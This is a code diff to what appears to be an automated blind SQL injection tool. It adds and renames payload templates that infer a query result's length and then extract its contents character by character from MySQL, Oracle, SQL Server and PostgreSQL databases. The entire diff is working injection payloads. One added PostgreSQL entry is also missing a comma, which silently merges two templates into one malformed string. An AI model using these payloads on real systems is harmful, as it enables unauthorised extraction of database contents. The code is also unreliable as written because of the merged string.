@@ -35,39 +35,48 @@ LENGTH_PAYLOADS = {
     "MySQL": [
         "ORD(MID(LENGTH({query}),{position},1))={char}",
         "ORD(MID(IFNULL(LENGTH({query}),0),{position},1))={char}",
+        "ORD(MID(IFNULL(CAST(LENGTH({query}) AS NCHAR),0),{position},1))={char}",
     ],
     "Oracle": [
         "ASCII(SUBSTRC(LENGTH({query}),{position},1))={char}",
         "ASCII(SUBSTRC(NVL(LENGTH({query}),0),{position},1))={char}",
+        "ASCII(SUBSTRC(NVL(CAST(LENGTH({query}) AS VARCHAR(4000)),0),{position},1))={char}",
     ],
     "Microsoft SQL Server": [
         "UNICODE(SUBSTRING(LTRIM(STR(LEN({query}))),{position},1))={char}",
         "UNICODE(SUBSTRING(LEN({query}),{position},1))={char}",
+        "UNICODE(SUBSTRING(ISNULL(CAST(LEN({query}) AS NVARCHAR(4000)),0),{position},1))={char}",
     ],
     "PostgreSQL": [
-        "ASCII(SUBSTRING(LENGTH({query}::text)::text FROM {position} FOR 1))={char}"
+        "ASCII(SUBSTRING(LENGTH({query}::text)::text FROM {position} FOR 1))={char}",
+        "ASCII(SUBSTRING(COALESCE(LENGTH({query})::text,CHR(48))::text FROM {position} FOR 1))={char}"
+        "ASCII(SUBSTRING(COALESCE(CAST(LENGTH({query})::text AS VARCHAR(10000))::text,CHR(32))::text FROM {position} FOR 1))={char}",
     ],
 }
 
 DATA_EXTRACTION_PAYLOADS = {
     "MySQL": {
-        "ASCII": "ORD(MID({query},{position},1))={char}",
-        "ASC": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
+        "no-cast": "ORD(MID({query},{position},1))={char}",
+        "isnull": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
+        "cast": "ORD(MID(IFNULL(CAST({query} AS NCHAR),0x20),{position},1))={char}",
         # "CHAR": "MID({query},{position},1)=CHAR({char})",
     },
     "Oracle": {
-        "ASCII": "ASCII(SUBSTRC({query},{position},1))={char}",
-        "ASC": "ASCII(SUBSTRC(NVL({query},CHR(32)),{position},1))={char}",
+        "no-cast": "ASCII(SUBSTRC({query},{position},1))={char}",
+        "isnull": "ASCII(SUBSTRC(NVL({query},CHR(32)),{position},1))={char}",
+        "cast": "ASCII(SUBSTRC(NVL(CAST({query} AS NVARCHAR(4000)),CHR(32)),{position},1))={char}",
         # "CHAR": "SUBSTR({query},{position},1)=CHR({char})",
     },
     "Microsoft SQL Server": {
-        "ASCII": "UNICODE(SUBSTRING({query},{position},1))={char}",
-        "ASC": "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
+        "no-cast": "UNICODE(SUBSTRING({query},{position},1))={char}",
+        "isnull": "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
+        "cast": "UNICODE(SUBSTRING(ISNULL(CAST({query} AS NVARCHAR(4000)),' '),{position},1))={char}",
         # "CHAR": "SUBSTRING({query},{position},1)=CHAR({char})",
     },
     "PostgreSQL": {
-        "ASCII": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
-        "ASC": "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
+        "no-cast": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
+        "isnull": "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
+        "cast": "ASCII(SUBSTRING((COALESCE(CAST({query} AS VARCHAR(10000))::text,CHR(32)))::text FROM {position} FOR 1))={char}",
         # "CHAR": "SUBSTRING({query}::text FROM {position} FOR 1)=CHR({char})",
     },
 }
